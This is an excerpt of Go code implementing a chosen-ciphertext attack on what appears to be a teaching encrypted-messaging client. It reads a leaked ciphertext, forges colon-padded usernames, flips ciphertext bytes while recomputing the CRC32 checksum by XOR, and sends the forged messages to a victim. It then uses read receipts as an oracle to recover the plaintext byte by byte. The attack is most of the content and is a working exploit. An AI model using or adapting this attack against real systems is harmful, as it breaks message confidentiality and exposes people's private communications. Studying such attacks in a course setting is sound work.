...
func doReadAndSendMessage(recipient string, messageBody string) error {
	...
	// simulate ciphertext sniff for attack mode
	msg := MessageStruct{username, recipient, messageIDCounter, 0, b64.StdEncoding.EncodeToString([]byte(encryptedMessage)), "", "", ""}
	body, err := json.Marshal(msg)
	if err != nil {
		fmt.Println("marshal ciphertext failed", err)
		return err
	}
	//save leaked ciphertext to file
	os.WriteFile(attackFile, body, 0755)
...
func decryptMessage(payload string, senderUsername string, senderPubKey *PubKeyStruct, recipientPrivKey *PrivKeyStruct) ([]byte, error) {
	...
	parse1 := bytes.LastIndexByte(M1, 0x3A)
	if parse1 == -1 || parse1 > len(M1) {
		return nil, errors.New("parse failed")
	}

	username := M1[0:parse1]
	if parse1+1 > len(M1)-4 {
		return nil, errors.New("out of range")

	}
	M := M1[parse1+1 : len(M1)-4]

	//disable CRC check for exploit
	...
	if !bytes.Equal(username, []byte(senderUsername)) {
		return nil, errors.New("username is not equal")
	}
...
func decryptMessages(messageArray []MessageStruct) error {
	...
	for i, m := range messageArray {
		...
		if len(getM) >= 6 && string(getM[:6]) == "MSGURL" {
...
func readAttackFile(attackFile string) (string, CiphertextStruct, error) {
	File, err := os.ReadFile(attackFile)
	var C CiphertextStruct
	...
	if err != nil {
		fmt.Println("parse msg structure failed")
		return "", C, err
	}

	decPayload, err := b64.StdEncoding.DecodeString(msg.Payload)
	if err != nil {
		fmt.Println("base64 decode payload failed")
		return msg.From, C, err
	}

	err = json.Unmarshal([]byte(decPayload), &C)
	if err != nil {
		fmt.Println("unmarshal C failed")
		return msg.From, C, err
	}
	return msg.From, C, nil
}

func encryptCommand(command string, C1 string) ([]byte, error) {

	C2 := base64.StdEncoding.EncodeToString([]byte(command))
	//----------Sig-------
	//form string
	toSign := C1 + C2
...
func sendAttackCommands(victim string, command string, C1 string) error {

	encryptedMessage, err := encryptCommand(command, C1)
	if err != nil {
		fmt.Printf("Could not encrypt command for victim %s.\n", victim)
		return err
	}
	err = sendMessageToServer(username, victim, []byte(encryptedMessage), 0)
	if err != nil {
		fmt.Println("Unable to send encryptedMessage to server, exiting.")
		os.Exit(1)
	}
...
func IsColon() bool {
	messageArray, err := getMessagesFromServer()
	if err != nil {
	...
	// Iterate through the array, fetch read recepit
	for i := 0; i < len(messageArray); i++ {
		if messageArray[i].ReceiptID != 0 {
			return true
		}
...
func reCalculateChecksum(C2 []byte, strSlice []byte) []byte {
	check := make([]byte, 4)
	...
	M2 := make([]byte, len(M1))
	for i := 0; i < len(strSlice)-4; i++ {
		M2[i] = M1[i] ^ strSlice[i]
	}

	checksum2 := crc32.ChecksumIEEE(M2)
	check2 := make([]byte, 4)
	binary.LittleEndian.PutUint32(check2, checksum2)

	M3 := make([]byte, len(M1))
	checksum3 := crc32.ChecksumIEEE(M3)
	check3 := make([]byte, 4)
	binary.LittleEndian.PutUint32(check3, checksum3)

	for i := 0; i < 4; i++ {
		check[i] = check1[i] ^ check2[i] ^ check3[i]
	}
	return check
}
...
func attack() error {
	...
	mFrom, C, err := readAttackFile(attackFile)
	if err != nil {
	...
	//compose plaintext
	C2, err := base64.StdEncoding.DecodeString(C.C2)
	if err != nil {
		fmt.Println("C2 base64 decode failed ")
		return err
	}

	strSlice := make([]byte, len(C2))
	copy(strSlice, C2)

	plaintext := make([]byte, len(strSlice))
	copy(plaintext[0:len(mFrom)], []byte(mFrom))
	plaintext[len(mFrom)] = ':'

	for i := len(mFrom) + 1; i < len(strSlice)-4; i++ {
		username = mFrom + strings.Repeat(":", i-len(mFrom))
		fmt.Println("forged username:", username)

		userLogin(username, "123")
		...
		for a := 0; a < 256; a++ {
			...
			check := reCalculateChecksum(C2, strSlice)
			copy(strSlice[len(strSlice)-4:], check[0:4])

			err = sendAttackCommands(victim, string(strSlice), C.C1)
			if err != nil {
				fmt.Println("send AttackCommands failed")
				return err
			}
			...
			if IsColon() {
				...
				p := key ^ oV
				plaintext[i] = p
				fmt.Println("recovering in progress:", string(plaintext))
				break
			}
		}
	}
	fmt.Println("successfully recover message:")
	fmt.Println(string(plaintext[:len(plaintext)-4]))
...
func main() {
	...
	flag.StringVar(&attackFile, "attack", "leaked_ciphertext.txt", "ciphertext file (default is ./leaked_ciphertext.txt)")
	flag.StringVar(&victim, "victim", "", "choose victim")
	flag.Parse()
